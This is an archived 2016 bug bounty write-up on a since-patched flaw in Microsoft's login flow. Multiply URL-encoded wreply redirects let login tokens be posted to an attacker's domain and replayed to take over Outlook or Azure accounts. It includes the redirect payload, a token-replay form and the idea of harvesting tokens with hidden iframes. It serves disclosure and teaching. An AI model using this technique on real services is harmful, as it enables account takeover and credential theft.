---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-04-03_obtaining-login-tokens-for-an-outlook-office-or-azure-account.md
original_filename: 2016-04-03_obtaining-login-tokens-for-an-outlook-office-or-azure-account.md
title: Obtaining Login Tokens for an Outlook, Office or Azure Account
category: documents
detected_topics:
- oauth
- xss
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- oauth
- xss
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: 4413b269b16645adff5d95ad9f6bb5242a6f1f0bcc40b2f968c59be695f401fb
text_sha256: 6099cfef28b635153aac96fd95bb0e860aee1bf4749a252b6b4ad24d1fe4d675
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Obtaining Login Tokens for an Outlook, Office or Azure Account

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-04-03_obtaining-login-tokens-for-an-outlook-office-or-azure-account.md
- Source Type: markdown
- Detected Topics: oauth, xss, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `4413b269b16645adff5d95ad9f6bb5242a6f1f0bcc40b2f968c59be695f401fb`
- Text SHA256: `6099cfef28b635153aac96fd95bb0e860aee1bf4749a252b6b4ad24d1fe4d675`


## Content

---
title: "Obtaining Login Tokens for an Outlook, Office or Azure Account"
page_title: "Obtaining Login Tokens for an Outlook, Office or Azure Account – Jack"
url: "https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/"
final_url: "https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/"
authors: ["Jack Whitton (@fin1te)"]
programs: ["Microsoft"]
bugs: ["CSRF"]
publication_date: "2016-04-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6307
---

# [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Obtaining Login Tokens for an Outlook, Office or Azure Account")

## April 03, 2016

__Reading time ~3 minutes

_This is pretty similar to Wes’s[awesome OAuth CSRF in Live](https://www.synack.com/2015/10/08/how-i-hacked-hotmail/), except it’s in the main Microsoft authentication system rather than the OAuth approval prompt._

Microsoft, being a huge company, have various services spread across multiple domains (`*.outlook.com`, `*.live.com`, and so on).

To handle authentication across these services, requests are made to [login.live.com](https://login.live.com), [login.microsoftonline.com](https://login.microsoftonline.com), and [login.windows.net](https://login.windows.net) to get a session for the user.

The flow for [outlook.office.com](https://outlook.office.com) is as follows:

  * User browses to <https://outlook.office.com>
  * User is redirected to [https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&id=260563](https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&id=260563)
  * Provided that the user is logged in, a [POST](https://en.wikipedia.org/wiki/POST_\(HTTP\)) request is made back to the value of `wreply`, with the form field `t` containing a login token for the user:

  
  
  <html>
  <head>
  <noscript>JavaScript required to sign in</noscript>
  <title>Continue</title>
  <script type="text/javascript">
  function OnBack(){}function DoSubmit(){var subt=false;if(!subt){subt=true;document.fmHF.submit();}}
  </script>
  </head>
  <body onload="javascript:DoSubmit();">
  <form name="fmHF" id="fmHF" action="https://outlook.office.com/owa/?wa=wsignin1.0" method="post" target="_self">
  <input type="hidden" name="t" id="t" value="EgABAgMAAAAEgAAAA...">
  </form>
  </body>
  </html>

  * The service then consumes the token, and logs the user in.

Since the services are hosted on completely separate domains, and therefore cookies can’t be used, the token is the only value needed to authenticate as a user. This is similar-ish to how OAuth works.

What this means is that if we can get the above code to POST the value of `t` to a server we control, we can impersonate the user.

As expected, if we try and change the value of `wreply` to a non-Microsoft domain, such as `example.com`, we receive an error, and the request isn’t processed:

[ ![](/images/microsoft/login-3.png) ](/images/microsoft/login-3.png)

### Fun with URL-Encoding and URL Parsing

One fun trick to play around with is [URL-encoding](https://en.wikipedia.org/wiki/Percent-encoding) parameters multiple times. Occasionally this can be used to bypass different filters, which is the root cause of the bug.

In this case, `wreply` is URL-decoded before the domain is checked. Therefore `https%3a%2f%2foutlook.office.com%2f` becomes `https://outlook.office.com/`, which is valid, and the request goes through.
  
  
  <form name="fmHF" id="fmHF" action="**https://outlook.office.com/**?wa=wsignin1.0" method="post" target="_self">
  

What’s interesting is that when passing a value of `https%3a%2f%2foutlook.office.com%252f` an error is thrown, since `https://outlook.office.com%2f` isn’t a valid URL.

However, appending `@example.com` _doesn’t_ generate an error. Instead, it gives us the following, which is a valid URL:
  
  
  <form name="fmHF" id="fmHF" action="**https://outlook.office.com%[[email protected]](/cdn-cgi/l/email-protection)/**?wa=wsignin1.0" method="post" target="_self">
  

_If you’re wondering why this is valid, it’s because the[syntax of a URL](https://en.wikipedia.org/wiki/Uniform_Resource_Locator#Syntax) is as follows:_
  
  
  scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]
  

From this you can tell that the server is doing two checks:

  * The first is a sanity check on the URL, to ensure it’s valid, which it is, since `outlook.office.com%2f` is the username part of the URL.

  * The second is to determine if the domain is allowed. This second check should fail - `example.com` is **not** allowed.

It’s clear that server is decoding `wreply` _n_ times until there are no longer any encoded characters, and _then_ validating the domain. This sort of inconsistency is something I’m [quite familiar with](/articles/safecurl-capture-the-bitcoins-post-mortem/#url-parsing-issue-1).

Now that we can specify an arbitrary URL to POST the token, the rest is trivial. We set the redirect to `https%3a%2f%2foutlook.office.com%[[email protected]](/cdn-cgi/l/email-protection)%2fmicrosoft%2f%3f`, which results in:
  
  
  <form name="fmHF" id="fmHF" action="**https://outlook.office.com%[[email protected]](/cdn-cgi/l/email-protection)/microsoft/?**&wa=wsignin1.0" method="post" target="_self">
  

This causes the token to be sent to our site:

[ ![](/images/microsoft/login-4.png) ](/images/microsoft/login-4.png)

Then we simply replay the token ourselves:
  
  
  <form action="https://outlook.office.com/owa/?wa=wsignin1.0" method="post">
  <input name="t" value="**EgABAgMAAAAEgAAAAwAB...** ">
  <input type="submit">
  </form>
  

Which then gives us complete access to the user’s account:

[ ![](/images/microsoft/login-2.png) ](/images/microsoft/login-2.png)

Note: The token is only valid for the service which issued it - an Outlook token can’t be used for Azure, for example. But it’d be simple enough to create multiple hidden iframes, each with the login URL set to a different service, and harvest tokens that way.

This was quite a fun CSRF to find and exploit. Despite CSRF bugs not having the same credibility as other bugs, when discovered in authentication systems their impact can be pretty large.

## Fix

The hostname in `wreply` now must end in `%2f`, which gets URL-decoded to `/`.

This ensures that the browser only sends the request to the intended host.

## Timeline

  * Sunday, 24th January 2016 - Issue Reported
  * Sunday, 24th January 2016 - Issue Confirmed & Triaged
  * Tuesday, 26th January 2016 - Issue Patched

[websec](https://whitton.io/tags/#websec "Pages tagged websec")[bugbounty](https://whitton.io/tags/#bugbounty "Pages tagged bugbounty")[microsoft](https://whitton.io/tags/#microsoft "Pages tagged microsoft")[office](https://whitton.io/tags/#office "Pages tagged office")[outlook](https://whitton.io/tags/#outlook "Pages tagged outlook")[azure](https://whitton.io/tags/#azure "Pages tagged azure")[csrf](https://whitton.io/tags/#csrf "Pages tagged csrf") Updated on April 03, 2016 Jack

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Share on Google Plus")

[Read More](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)

### [From Bug Bounty Hunter, to Engineer, and Beyond](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/ "From Bug Bounty Hunter, to Engineer, and Beyond")

A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a "new chapter" in my ...… [Continue reading](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/)

#### [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Uber Bug Bounty: Turning Self-XSS into Good-XSS")

Published on March 22, 2016

#### [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/ "An XSS on Facebook via PNGs & Wonky Content Types")

Published on January 27, 2016
